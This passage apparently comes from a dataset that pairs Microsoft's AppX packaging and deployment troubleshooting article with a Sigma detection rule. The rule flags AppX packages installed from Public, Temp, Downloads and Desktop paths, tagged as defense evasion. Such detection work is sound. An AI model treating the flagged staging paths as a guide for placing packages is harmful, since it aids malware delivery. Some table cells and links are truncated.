0x80073D23 | The deployment operation was blocked because special profile deployment is not allowed (special profiles are user profiles where changes are discarded after the user signs out). Try logging into an account that is not a special profile. You can try logging out and logging back into the current account, or try logging into a different account.                                                                                                                                                                                                                                                                                                                                                                                                                   |\n| **ERROR_DEPLOYMENT_FAILED_**  <br>**CONFLICTING_MUTABLE_PACKAGE_**  <br>**DIRECTORY**                  | 0x80073D24 | The deployment operation failed due to a conflicting package's [mutable package directory](/en-us/uwp/schemas/appxpackage/uapmanifestschema/element-desktop6-mutablepackagedirectory). To install this package, remove the existing package with the conflicting mutable package directory.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |\n| **ERROR_SINGLETON_RESOURCE_**  <br>**INSTALLED_IN_ACTIVE_USER**                                        | 0x80073D25 | The package installation failed because a singleton resource was specified and another user with that package installed is logged in. Make sure that all active users with the package installed are logged out and retry installation|\n| ERROR_DIFFERENT_VERSION_  <br>**OF_PACKAGED_SERVICE_INSTALLED**                                        | 0x80073D26 | The package installation failed because a different version of the service is installed. Try installing a newer version of the package|\n| **ERROR_SERVICE_EXISTS_**  <br>**AS_NON_PACKAGED_SERVICE**                                             | 0x80073D27 | The package installation failed because a version of the service exists outside of an .msix/.appx package. Contact your software vendor|\n| **ERROR_PACKAGED_SERVICE_**  <br>**REQUIRES_ADMIN_PRIVILEGES**                                         | 0x80073D28 | The package installation failed because administrator privileges are required. Contact an administrator to install this package.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |\n| **ERROR_REDIRECTION_TO_**  <br>**DEFAULT_ACCOUNT_NOT_ALLOWED**                                         | 0x80073D29 | The package deployment failed because the operation would have redirected to default account, when the caller said not to do so|\n| **ERROR_PACKAGE_LACKS_**  <br>**CAPABILITY_TO_DEPLOY_ON_HOST**                                         | 0x80073D2A | The package deployment failed because the package requires a capability to natively target this host|\n| **ERROR_UNSIGNED_PACKAGE_**  <br>**INVALID_CONTENT**                                                   | 0x80073D2B | The package deployment failed because its content is not valid for an unsigned package|\n| **ERROR_UNSIGNED_PACKAGE_**  <br>**INVALID_PUBLISHER_NAMESPACE**                                       | 0x80073D2C | The package deployment failed because its publisher is not in the unsigned namespace|\n| **ERROR_SIGNED_PACKAGE_**  <br>**INVALID_PUBLISHER_NAMESPACE**                                         | 0x80073D2D | The package deployment failed because its publisher is not in the signed namespace|\n| **ERROR_PACKAGE_EXTERNAL_**  <br>**LOCATION_NOT_ALLOWED**                                              | 0x80073D2E | The package deployment failed because its publisher is not in the signed namespace|\n| **ERROR_INSTALL_FULLTRUST_**  <br>**HOSTRUNTIME_REQUIRES_MAIN_**  <br>**PACKAGE_FULLTRUST_CAPABILITY** | 0x80073D2F | A host runtime dependency resolving to a package with full trust content requires the main package to have the **runFullTrust** capability|\n| **APPX_E_PACKAGING_INTERNAL**                                                                          | 0x80080200 | The packaging API has encountered an internal error|\n| **APPX_E_INTERLEAVING_**  <br>**NOT_ALLOWED**                                                          | 0x80080201 | The package isn't valid because its contents are interleaved.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |\n| **APPX_E_RELATIONSHIPS_**  <br>**NOT_ALLOWED**                                                         | 0x80080202 | The package isn't valid because it contains OPC relationships|\n| **APPX_E_MISSING_**  <br>**REQUIRED_FILE**                                                             | 0x80080203 | The package isn't valid because it's missing a manifest or block map, or a code integrity file is present but a signature file is missing.  <br>Ensure that the package isn't missing one or more of these required files:  <br><br>*   \\\\AppxManifest.xml<br>*   \\\\AppxBlockMap.xml<br><br>If the package contains \\\\AppxMetadata\\\\CodeIntegrity.cat, it must also contain \\\\AppxSignature.p7x.                                                                                                                                                                                                                                                                                                                                                                           |\n| **APPX_E_INVALID_MANIFEST**                                                                            | 0x80080204 | The package's AppxManifest.xml file isn't valid|\n| **APPX_E_INVALID_BLOCKMAP**                                                                            | 0x80080205 | The package's AppxBlockMap.xml file isn't valid|\n| **APPX_E_CORRUPT_CONTENT**                                                                             | 0x80080206 | The package contents can't be read because it's corrupted|\n| **APPX_E_BLOCK_**  <br>**HASH_INVALID**                                                                | 0x80080207 | The computed hash value of the block doesn't match the has value stored in the block map|\n| **APPX_E_REQUESTED_**  <br>**RANGE_TOO_LARGE**                                                         | 0x80080208 | The requested byte range is over 4 GB when translated to a byte range of blocks|\n| **TRUST_E_NOSIGNATURE**                                                                                | 0x800B0100 | No signature is present in the subject.  <br>You may get this error if the package is unsigned or the signature isn't valid. The package must be signed to be deployed|\n| **CERT_E_UNTRUSTEDROOT**                                                                               | 0x800B0109 | A certificate chain processed, but terminated in a root certificate which isn't trusted by the trust provider.  <br>See [Signing a package](/en-us/previous-versions/br230260(v=vs|\n| **CERT_E_CHAINING**                                                                                    | 0x800B010A | A certificate chain couldn't be built to a trusted root certification authority.  <br>See [Signing a package](/en-us/previous-versions/br230260(v=vs|\n| **APPX_E_INVALID_**  <br>**SIP_CLIENT_DATA**                                                           | 0x80080209 | The [**SIP_SUBJECTINFO**](/en-us/windows/win32/api/mssip/ns-mssip-sip_subjectinfo)structure used to sign the package didn't contain the required data|\n| **APPX_E_INVALID_**  <br>**KEY_INFO**                                                                  | 0x8008020A | The [**APPX_KEY_INFO**](/en-us/windows/win32/api/appxpackaging/ns-appxpackaging-appx_key_info) structure used to encrypt or decrypt the package contains invalid data|\n| **APPX_E_INVALID_**  <br>**CONTENTGROUPMAP**                                                           | 0x8008020B | The .msix/.appx package's content group map is invalid|\n| **APPX_E_INVALID_**  <br>**APPINSTALLER**                                                              | 0x8008020C | The [.appinstaller file](/en-us/windows/msix/app-installer/app-installer-root) for the package is invalid|\n| **APPX_E_DELTA_BASELINE_**  <br>**VERSION_MISMATCH**                                                   | 0x8008020D | The baseline package version in delta package does not match the version in the baseline package to be updated.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |\n| **APPX_E_DELTA_PACKAGE_**  <br>**MISSING_FILE**                                                        | 0x8008020E | The delta package is missing a file from the updated package|\n| **APPX_E_INVALID_**  <br>**DELTA_PACKAGE**                                                             | 0x8008020F | The delta package is invalid|\n| **APPX_E_DELTA_APPENDED_**  <br>**PACKAGE_NOT_ALLOWED**                                                | 0x80080210 | The delta appended package is not allowed for the current operation.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |\n| **APPX_E_INVALID_**  <br>**PACKAGING_LAYOUT**                                                          | 0x80080211 | The packaging layout file is invalid|\n| **APPX_E_INVALID_**  <br>**PACKAGESIGNCONFIG**                                                         | 0x80080212 | The packageSignConfig file is invalid|\n| **APPX_E_RESOURCESPRI_**  <br>**NOT_ALLOWED**                                                          | 0x80080213 | The resources.pri file is not allowed when there are no resource elements in the package manifest|\n| **APPX_E_FILE_**  <br>**COMPRESSION_MISMATCH**                                                         | 0x80080214 | The compression state of file in baseline and updated package does not match|\n| **APPX_E_INVALID_**  <br>**PAYLOAD_PACKAGE_EXTENSION**                                                 | 0x80080215 | Non .appx extensions are not allowed for payload packages targeting older platforms|\n| **APPX_E_INVALID_**  <br>**ENCRYPTION_EXCLUSION_FILE_LIST**                                            | 0x80080216 | The encryptionExclusionFileList file is invalid|\n\n## Applications don't start and their names are dimmed\n\nOn a computer running Windows 10 or later, you can't start some applications, and the application names appear dimmed.\n\n```image\nAlt: Some application names appear dimmed in the Start menu\nDescription: The image depicts a Windows Start menu containing a list of applications, some of which are dimmed. The highlighted application names include '7-Zip', 'Access 2016', 'Acrobat Distiller 6.0', 'Acrobat Reader DC', and 'Adobe Acrobat 6.0 Standard'. The dimmed appearance indicates that these applications may not be functioning properly, aligning with the troubleshooting context provided, which discusses issues related to application startup and error messages associated with certain Windows apps.\nTranscription: |\n  #\n  7-Zip\n  A\n  Access 2016\n  Acrobat Distiller 6.0\n  Acrobat Reader DC\n  Adobe Acrobat 6.0 Standard\n```\n\nWhen you try to open an application by selecting the dimmed name, you may receive one of the following error messages:\n\n> There's a problem with <em>application name</em>. Contact your system administrator about repairing or reinstalling it\n> Error: This app can't open\n\nAdditionally, the following event entries are logged in the \"Microsoft-Windows-TWinUI/Operational\" log under **Applications and Services\\Microsoft\\Windows\\Apps**:\n\n> Log Name: Microsoft-Windows-TWinUI/Operational\n> Source: Microsoft-Windows-Immersive-Shell\n> Date: <em>date</em>\n> Event ID: 5960\n> Task Category: (5960)\n> Level: Error\n> Keywords:\n> Description:\n> Activation of the app Microsoft.BingNews_8wekyb3d8bbwe!AppexNews for the Windows. Launch contract was blocked with error 0x80073CFC because its package is in state: Modified.\n\n### Cause\n\nThis issue occurs because the registry entry for the status value of application's corresponding package was modified.\n\n### Resolution\n\n> **Warning**\n> Serious problems might occur if you modify the registry incorrectly by using Registry Editor or by using another method. These problems might require that you reinstall the operating system. Microsoft cannot guarantee that these problems can be solved. Modify the registry at your own risk.\n\nTo fix this issue:\n\n1. Start Registry Editor, and then locate the **HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppModel\\StateChange\\PackageList** subkey.\n2. To back up the subkey data, right-click **PackageList**, select **Export**, and then save the data as a registry file.\n3. For each of the applications that are listed in the Event ID 5960 log entries, follow these steps:\n   1. Locate the **PackageStatus** entry.\n   2. Set the value of **PackageStatus** to zero (**0**).\n\n   > **Note**\n   > If there are no entries for the application under **PackageList**, then the issue has some other cause. In the case of the example event in this article, the full subkey is **HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppModel\\StateChange\\PackageList\\Microsoft.BingNews_8wekyb3d8bbwe!AppexNews\\PackageStatus**.\n\n4. Restart the computer.\n\n## Get additional help\n\nIf you need further help with resolving a problem you are experiencing when packaging, deploying, or querying a Windows app package (.msix/.appx) as a developer, refer to these additional developer support resources.\n\n- Microsoft Q&A offers relevant and timely answers to your technical problems from a community of experts and Microsoft engineers.\n- For community assistance with development questions, there are our forums, and StackOverflow.\n- The Windows developer support site explains other support options.\n\n## Related topics\n\n- How to sign an app package using SignTool\n- How to troubleshoot app package signature errors",
    "sigma_rule": {
      "title": "Suspicious AppX Package Locations",
      "id": "5cdeaf3d-1489-477c-95ab-c318559fc051",
      "status": "test",
      "description": "Detects an appx package added the pipeline of the \"to be processed\" packages which is located in suspicious locations",
      "references": [
        "Internal Research",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
        "https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting",
        "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "service": "appxdeployment-server"
      },
      "detection": {
        "selection": {
          "EventID": 854,
          "Path|contains": [
            "C:\\Users\\Public\\",
            "/users/public/",
            "C:\\PerfLogs\\",
            "C:/perflogs/",
            "\\Desktop\\",
            "/desktop/",
            "\\Downloads\\",
            "/Downloads/",
            "C:\\Windows\\Temp\\",
            "C:/Windows/Temp/",
            "\\AppdData\\Local\\Temp\\",
            "/AppdData/Local/Temp/"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\appxdeployment_server\\win_appxdeployment_server_susp_package_locations.yml",
    "id": "709"
  },
  {
    "url": "https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting",
    "markdown": "# Troubleshooting packaging, deployment, and query of Windows apps\n\nUse these suggestions to troubleshoot problems you experience when packaging, deploying, or querying a Windows app package (.msix/.appx) as a developer.\n\n> **Note**\n> This article is intended for developers. If you are not a developer and you are looking for help with a Windows app installation error, see Windows support.\n\n## Get diagnostic information\n\nWhen an API fails, it returns an error code that describes the problem. If the error code doesn't provide enough information, you find more diagnostic information in the detailed event logs.\n\nTo access the packaging and deployment event logs by using **Event Viewer**, follow these steps:\n\n1. Perform one of the following steps:\n   - Click **Start** on the Windows menu, type **Event Viewer**, and press **Enter**.\n   - Run **eventvwr.msc**.\n2. In the left page, expand **Event Viewer (Local) > Applications and Services Logs > Microsoft > Windows**.\n3. Check for available logs under these categories:\n   - **AppxPackagingOM > Microsoft-Windows-AppxPackaging/Operational**\n   - **AppXDeployment-Server > Microsoft-Windows-AppXDeploymentServer/Operational**\n\nStart by looking at the logs under **AppXDeployment-Server**. If the error was caused by **0x80073CF0** or **ERROR_INSTALL_OPEN_PACKAGE_FAILED**, additional details may be present in the **AppxpackagingOM** logs.\n\nYou can also use the Get-AppxLog command in PowerShell to get the first few logged events. The following example displays the logs associated with the most recent deployment operation.\n\n```\nGet-Appxlog\n```\n\nThe following example displays the logs associated with the most recent deployment operation in an interactive table in a separate window.\n\n```\nGet-Appxlog | Out-GridView\n```\n\n## Common error codes\n\nThis table lists some of the most common error codes. If you need further help with one of these errors, or if you're encountering an error code not in this list, see additional help options.\n\n| Error code                                                                                             | Value      | Description and possible causes|\n| ------------------------------------------------------------------------------------------------------ | ---------- ||\n| **E_FILENOTFOUND**                                                                                     | 0x80070002 | File or path is not found. This can occur during a COM typelib validation requires that the path for the directory actually exist within your MSIX package|\n| **ERROR_BAD_FORMAT**                                                                                   | 0x8007000B | The package isn't correctly formatted and needs to be re-built or re-signed.  <br>You may get this error if there is a mismatch between the signing certificate subject name and the AppxManifest.xml publisher name.  <br>See [How to sign an app package using SignTool](how-to-sign-a-package-using-signtool).                                                                                                                                                                                                                                                                                                                                                                                                                                                          |\n| **E_INVALIDARG**                                                                                       | 0x80070057 | One or more arguments are not valid. If you check the AppXDeployment-Server event log and see the following event: \"While installing the package, the system failed to register the windows.repositoryExtension extension due to the following error: The parameter is incorrect.\"  <br>You may get this error if the manifest elements DisplayName or Description contain characters disallowed by Windows firewall such as `\\                                                                                                                                                                                                                                                                                                                                            | `, due to which Windows fails to create the AppContainer profile for the package. Please remove these characters from the manifest and try installing the package. |\n| **ERROR_INSTALL_OPEN_**  <br>**PACKAGE_FAILED**                                                        | 0x80073CF0 | The package couldn't be opened.  <br>Possible causes:  <br><br>*   The package is unsigned.<br>*   The publisher name doesn't match the signing certificate subject.<br>*   The file:// prefix is missing or the package couldn't be found at the specified location.<br><br>For more information, check the **AppxPackagingOM** event log.                                                                                                                                                                                                                                                                                                                                                                                                                                |\n| **ERROR_INSTALL_PACKAGE_**  <br>**NOT_FOUND**                                                          | 0x80073CF1 | The package couldn't be found.  <br>You may get this error while removing a package that isn't installed for the current user|\n| **ERROR_INSTALL_INVALID_**  <br>**PACKAGE**                                                            | 0x80073CF2 | The package data isn't valid|\n| **ERROR_INSTALL_RESOLVE_**  <br>**DEPENDENCY_FAILED**                                                  | 0x80073CF3 | The package failed update, dependency, or conflict validation.  <br>Possible causes:  <br><br>*   The incoming package conflicts with an installed package.<br>*   A specified package dependency can't be found.<br>*   The package doesn't support the correct processor architecture.<br><br>For more informtion, check the **AppXDeployment-Server** event log.                                                                                                                                                                                                                                                                                                                                                                                                        |\n| **ERROR_INSTALL_OUT_**  <br>**OF_DISK_SPACE**                                                          | 0x80073CF4 | There isn't enough disk space on your computer. Free some space and try again|\n| **ERROR_INSTALL_NETWORK_**  <br>**FAILURE**                                                            | 0x80073CF5 | The package can't be downloaded|\n| **ERROR_INSTALL_**  <br>**REGISTRATION_FAILURE**                                                       | 0x80073CF6 | The package can't be registered.  <br>For more information, check the **AppXDeployment-Server** event log|\n| **ERROR_INSTALL_**  <br>**DEREGISTRATION_EFAILURE**                                                    | 0x80073CF7 | The package can't be unregistered.  <br>You may get this error while removing a package.  <br>For more information, check the **AppXDeployment-Server** event log|\n| **ERROR_INSTALL_CANCEL**                                                                               | 0x80073CF8 | The user canceled the install request|\n| **ERROR_INSTALL_FAILED**                                                                               | 0x80073CF9 | Package install failed. Contact the software vendor.  <br>For more information, check the **AppXDeployment-Server** event log|\n| **ERROR_REMOVE_FAILED**                                                                                | 0x80073CFA | Package removal failed.  <br>You may get this error for failures that occur during package uninstall.  <br>For more information, see [**RemovePackageAsync**](/en-us/uwp/api/windows.management.deployment.packagemanager.removepackageasync|\n| **ERROR_PACKAGE_**  <br>**ALREADY_EXISTS**                                                             | 0x80073CFB | The provided package is already installed, and reinstallation of the package is blocked.  <br>You may get this error if installing a package that is not bitwise identical to the package that is already installed. Note that the digital signature is also part of the package. Hence if a package is rebuilt or resigned, it is no longer bitwise identical to the previously installed package. Two possible options to fix this error are: (1) Increment the version number of the app, then rebuild and resign the package (2) Remove the old package for every user on the system before installing the new package.                                                                                                                                                |\n| **ERROR_NEEDS_REMEDIATION**                                                                            | 0x80073CFC | The app can't be started. Try reinstalling the app|\n| **ERROR_INSTALL_**  <br>**PREREQUISITE_FAILED**                                                        | 0x80073CFD | A specified install prerequisite couldn't be satisfied|\n| **ERROR_PACKAGE_**  <br>**REPOSITORY_CORRUPTED**                                                       | 0x80073CFE | The package repository is corrupted.  <br>You may get this error if the folder referenced by this registry key doesn't exist or is corrupted:  <br>**HKLM\\\\Software\\\\Microsoft\\\\Windows</strong>  <br>**CurrentVersion\\\\Appx\\\\PackageRepositoryRoot**  <br>To recover from this state, refresh your PC.  <br>**                                                                                                                                                                                                                                                                                                                                                                                                                                                            |\n| **ERROR_INSTALL_**  <br>**POLICY_FAILURE**                                                             | 0x80073CFF | To install this app, you need a developer license or a sideloading-enabled system.  <br>You may get this error if the package doesn't meet one of the following requirements:  <br><br>*   The app is deployed using F5 in Visual Studio on a computer with a Windows developer license.<br>*   The package is signed with a Microsoft signature and deployed as part of Windows or from the Microsoft Store.<br>*   The package is signed with a trusted signature and installed on a computer with a developer license, a domain-joined computer with the AllowAllTrustedApps policy enabled, or a computer with a Windows Sideloading license with the AllowAllTrustedApps policy enabled.                                                                              |\n| **ERROR_PACKAGE_UPDATING**                                                                             | 0x80073D00 | The app can't be started because it's currently updating|\n| **ERROR_DEPLOYMENT_**  <br>**BLOCKED_BY_POLICY**                                                       | 0x80073D01 | The package deployment operation is blocked by policy. Contact your system administrator.  <br>Possible causes:  <br><br>*   Package deployment is blocked by Application Control Policies.<br>*   Package deployment is blocked by the \"Allow deployment operations in special profiles\" policy.<br><br>One of the possible reasons is a need for a roaming profile. For information about setting up Roaming User Profiles on user accounts, see [Deploy Roaming User Profiles](/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/jj649079(v=ws.11)). If there are no policies configured on your system and you still see this error, perhaps you are logged in with a temporary profile. Log out and log in again, then try the operation again. |\n| **ERROR_PACKAGES_IN_USE**                                                                              | 0x80073D02 | The package couldn't be installed because resources it modifies are currently in use|\n| **ERROR_RECOVERY_**  <br>**FILE_CORRUPT**                                                              | 0x80073D03 | The package couldn't be recovered because data that's necessary for recovery is corrupted|\n| **ERROR_INVALID_**  <br>**STAGED_SIGNATURE**                                                           | 0x80073D04 | The signature isn't valid. To register in developer mode, AppxSignature.p7x and AppxBlockMap.xml must be valid or shouldn't be present.  <br>If you are a developer using F5 with Visual Studio, ensure that your built project directory doesn't contain signature or block map files from previous versions of the package.                                                                                                                                                                                                                                                                                                                                                                                                                                              |\n| **ERROR_DELETING_EXISTING_**  <br>**APPLICATIONDATA_STORE_FAILED**                                     | 0x80073D05 | An error occurred while deleting the package's previously existing application data.  <br>You can get this error if the [simulator](/en-us/previous-versions/hh441475(v=vs.110)) is running. Close the simulator. You can also get this error if there are files open in the app data (for example, if you have a log file open in a text editor).                                                                                                                                                                                                                                                                                                                                                                                                                         |\n| **ERROR_INSTALL_**  <br>**PACKAGE_DOWNGRADE**                                                          | 0x80073D06 | The package couldn't be installed because a higher version of this package is already installed|\n| **ERROR_SYSTEM_**  <br>**NEEDS_REMEDIATION**                                                           | 0x80073D07 | An error in a system binary was detected. To fix the problem, try refreshing the|\n| **ERROR_APPX_INTEGRITY_**  <br>**FAILURE_EXTERNAL**                                                    | 0x80073D08 | A corrupted non-Windows binary was detected on the system|\n| **ERROR_RESILIENCY_**  <br>**FILE_CORRUPT**                                                            | 0x80073D09 | The operation couldn't be resumed because data that's necessary for recovery is corrupted|\n| **ERROR_INSTALL_FIREWALL_**  <br>**SERVICE_NOT_RUNNING**                                               | 0x80073D0A | The package couldn't be installed because the Windows Firewall service isn't running. Enable the Windows Firewall service and try again|\n| **ERROR_PACKAGE_MOVE_FAILED**                                                                          | 0x80073D0B | The package move operation failed|\n| **ERROR_INSTALL_VOLUME_**  <br>**NOT_EMPTY**                                                           | 0x80073D0C | The deployment operation failed because the volume is not empty|\n| **ERROR_INSTALL_VOLUME_**  <br>**OFFLINE**                                                             | 0x80073D0D | The deployment operation failed because the volume is offline. For a package update, the volume refers to the installed volume of all package versions|\n| **ERROR_INSTALL_VOLUME_**  <br>**CORRUPT**                                                             | 0x80073D0E | The deployment operation failed because the specified volume is corrupt.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |\n| **ERROR_NEEDS_REGISTRATION**                                                                           | 0x80073D0F | The deployment operation failed because the specified application needs to be registered first|\n| **ERROR_INSTALL_WRONG_**  <br>**PROCESSOR_ARCHITECTURE**                                               | 0x80073D10 | The deployment operation failed because the package targets the wrong processor architecture|\n| **ERROR_DEV_SIDELOAD_**  <br>**LIMIT_EXCEEDED**                                                        | 0x80073D11 | You have reached the maximum number of developer sideloaded packages allowed on this device. Please uninstall a sideloaded package and try again|\n| **ERROR_INSTALL_OPTIONAL_**  <br>**PACKAGE_REQUIRES_**  <br>**MAIN_PACKAGE**                           | 0x80073D12 | A main app package is required to install this optional package. Install the main package first and try again|\n| **ERROR_PACKAGE_NOT_**  <br>**SUPPORTED_ON_FILESYSTEM**                                                | 0x80073D13 | This app package type is not supported on this filesystem|\n| **ERROR_PACKAGE_MOVE_**  <br>**BLOCKED_BY_STREAMING**                                                  | 0x80073D14 | Package move operation is blocked until the application has finished streaming|\n| **ERROR_INSTALL_OPTIONAL_**  <br>**PACKAGE_APPLICATIONID_**  <br>**NOT_UNIQUE**                        | 0x80073D15 | A main or another optional app package has the same application ID as this optional package. Change the application ID for the optional package to avoid conflicts|\n| **ERROR_PACKAGE_STAGING_**  <br>**ONHOLD**                                                             | 0x80073D16 | This staging session has been held to allow another staging operation to be prioritized|\n| **ERROR_INSTALL_INVALID_**  <br>**RELATED_SET_UPDATE**                                                 | 0x80073D17 | A related set cannot be updated because the updated set is invalid. All packages in the related set must be updated at the same time|\n| **ERROR_INSTALL_OPTIONAL_**  <br>**PACKAGE_REQUIRES_MAIN_**  <br>**PACKAGE_FULLTRUST_CAPABILITY**      | 0x80073D18 | An optional package with a FullTrust entry point requires the main package to have the **runFullTrust** capability|\n| **ERROR_DEPLOYMENT_BLOCKED_**  <br>**BY_USER_LOG_OFF**                                                 | 0x80073D19 | An error occurred because a user was logged off|\n| **ERROR_PROVISION_OPTIONAL_**  <br>**PACKAGE_REQUIRES_MAIN_**  <br>**PACKAGE_PROVISIONED**             | 0x80073D1A | An optional package provision requires the dependency main package to also be provisioned|\n| **ERROR_PACKAGES_REPUTATION_**  <br>**CHECK_FAILED**                                                   | 0x80073D1B | The packages failed the [SmartScreen reputation check](/en-us/windows/security/threat-protection/windows-defender-smartscreen/windows-defender-smartscreen-overview|\n| **ERROR_PACKAGES_REPUTATION_**  <br>**CHECK_TIMEDOUT**                                                 | 0x80073D1C | The [SmartScreen reputation check](/en-us/windows/security/threat-protection/windows-defender-smartscreen/windows-defender-smartscreen-overview) operation timed out|\n| **ERROR_DEPLOYMENT_OPTION_**  <br>**NOT_SUPPORTED**                                                    | 0x80073D1D | The current deployment option is not supported|\n| **ERROR_APPINSTALLER_**  <br>**ACTIVATION_BLOCKED**                                                    | 0x80073D1E | Activation is blocked due to the .appinstaller update settings for this app|\n| **ERROR_REGISTRATION_FROM_**  <br>**REMOTE_DRIVE_NOT_SUPPORTED**                                       | 0x80073D1F | Remote drives are not supported. Use **\\\\server\\\\share** to register a remote package|\n| **ERROR_APPX_RAW_**  <br>**DATA_WRITE_FAILED**                                                         | 0x80073D20 | Failed to process and write downloaded package data to disk|\n| **ERROR_DEPLOYMENT_BLOCKED_**  <br>**BY_VOLUME_POLICY_PACKAGE**                                        | 0x80073D21 | The deployment operation was blocked due to a per-package-family policy restricting deployments on a non-system volume. Per policy, this app must be installed to the system drive, but that's not set as the default. In Storage settings, make the system drive the default location to save new content, then retry the install.                                                                                                                                                                                                                                                                                                                                                                                                                                        |\n| **ERROR_DEPLOYMENT_BLOCKED_**  <br>**BY_VOLUME_POLICY_MACHINE**                                        | 0x80073D22 | The deployment operation was blocked due to a machine-wide policy restricting deployments on a non-system volume. Per policy, this app must be installed to the system drive, but that's not set as the default. In Storage settings, make the system drive the default location to save new content, then retry the install.                                                                                                                                                                                                                                                                                                                                                                                                                                              |\n| **ERROR_DEPLOYMENT_BLOCKED_**  <br>**BY_PROFILE_POLICY**                                               | 0x80073D23 | The deployment operation was blocked because special profile deployment is not allowed (special profiles are user profiles where changes are discarded after the user signs out). Try logging into an account that is not a special profile. You can try logging out and logging back into the current account, or try logging into a different account.                                                                                                                                                                                                                                                                                                                                                                                                                   |\n| **ERROR_DEPLOYMENT_FAILED_**  <br>**CONFLICTING_MUTABLE_PACKAGE_**  <br>**DIRECTORY**                  | 0x80073D24 | The deployment operation failed due to a conflicting package's [mutable package directory](/en-us/uwp/schemas/appxpackage/uapmanifestschema/element-desktop6-mutablepackagedirectory). To install this package, remove the existing package with the conflicting mutable package directory.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |\n| **ERROR_SINGLETON_RESOURCE_**  <br>**INSTALLED_IN_ACTIVE_USER**                                        | 0x80073D25 | The package installation failed because a singleton resource was specified and another user with that package installed is logged in. Make sure that all active users with the package installed are logged out and retry installation|\n| ERROR_DIFFERENT_VERSION_  <br>**OF_PACKAGED_SERVICE_INSTALLED**                                        | 0x80073D26 | The package installation failed because a different version of the service is installed. Try installing a newer version of the package|\n| **ERROR_SERVICE_EXISTS_**  <br>**AS_NON_PACKAGED_SERVICE**                                             | 0x80073D27 | The package installation failed because a version of the service exists outside of an .msix/.appx package. Contact your software vendor|\n| **ERROR_PACKAGED_SERVICE_**  <br>**REQUIRES_ADMIN_PRIVILEGES**                                         | 0x80073D28 | The package installation failed because administrator privileges are required. Contact an administrator to install this package|\n| **ERROR_REDIRECTION_TO_**  <br>**DEFAULT_ACCOUNT_NOT_ALLOWED**                                         | 0x80073D29 | The package deployment failed because the operation would have redirected to default account, when the caller said not to do so|\n| **ERROR_PACKAGE_LACKS_**  <br>**CAPABILITY_TO_DEPLOY_ON_HOST**                                         | 0x80073D2A | The package deployment failed because the package requires a capability to natively target this host|\n| **ERROR_UNSIGNED_PACKAGE_**  <br>**INVALID_CONTENT**                                                   | 0x80073D2B | The package deployment failed because its content is not valid for an unsigned package|\n| **ERROR_UNSIGNED_PACKAGE_**  <br>**INVALID_PUBLISHER_NAMESPACE**                                       | 0x80073D2C | The package deployment failed because its publisher is not in the unsigned namespace|\n| **ERROR_SIGNED_PACKAGE_**  <br>**INVALID_PUBLISHER_NAMESPACE**                                         | 0x80073D2D | The package deployment failed because its publisher is not in the signed namespace|\n| **ERROR_PACKAGE_EXTERNAL_**  <br>**LOCATION_NOT_ALLOWED**                                              | 0x80073D2E | The package deployment failed because its publisher is not in the signed namespace|\n| **ERROR_INSTALL_FULLTRUST_**  <br>**HOSTRUNTIME_REQUIRES_MAIN_**  <br>**PACKAGE_FULLTRUST_CAPABILITY** | 0x80073D2F | A host runtime dependency resolving to a package with full trust content requires the main package to have the **runFullTrust** capability|\n| **APPX_E_PACKAGING_INTERNAL**                                                                          | 0x80080200 | The packaging API has encountered an internal error|\n| **APPX_E_INTERLEAVING_**  <br>**NOT_ALLOWED**                                                          | 0x80080201 | The package isn't valid because its contents are interleaved|\n| **APPX_E_RELATIONSHIPS_**  <br>**NOT_ALLOWED**                                                         | 0x80080202 | The package isn't valid because it contains OPC relationships|\n| **APPX_E_MISSING_**  <br>**REQUIRED_FILE**                                                             | 0x80080203 | The package isn't valid because it's missing a manifest or block map, or a code integrity file is present but a signature file is missing.  <br>Ensure that the package isn't missing one or more of these required files:  <br><br>*   \\\\AppxManifest.xml<br>*   \\\\AppxBlockMap.xml<br><br>If the package contains \\\\AppxMetadata\\\\CodeIntegrity.cat, it must also contain \\\\AppxSignature.p7x.                                                                                                                                                                                                                                                                                                                                                                           |\n| **APPX_E_INVALID_MANIFEST**                                                                            | 0x80080204 | The package's AppxManifest.xml file isn't valid|\n| **APPX_E_INVALID_BLOCKMAP**                                                                            | 0x80080205 | The package's AppxBlockMap.xml file isn't valid|\n| **APPX_E_CORRUPT_CONTENT**                                                                             | 0x80080206 | The package contents can't be read because it's corrupted|\n| **APPX_E_BLOCK_**  <br>**HASH_INVALID**                                                                | 0x80080207 | The computed hash value of the block doesn't match the has value stored in the block map.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |\n| **APPX_E_REQUESTED_**  <br>**RANGE_TOO_LARGE**                                                         | 0x80080208 | The requested byte range is over 4 GB when translated to a byte range of blocks|\n| **TRUST_E_NOSIGNATURE**                                                                                | 0x800B0100 | No signature is present in the subject.  <br>You may get this error if the package is unsigned or the signature isn't valid. The package must be signed to be deployed|\n| **CERT_E_UNTRUSTEDROOT**                                                                               | 0x800B0109 | A certificate chain processed, but terminated in a root certificate which isn't trusted by the trust provider.  <br>See [Signing a package](/en-us/previous-versions/br230260(v=vs.110)).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |\n| **CERT_E_CHAINING**                                                                                    | 0x800B010A | A certificate chain couldn't be built to a trusted root certification authority.  <br>See [Signing a package](/en-us/previous-versions/br230260(v=vs|\n| 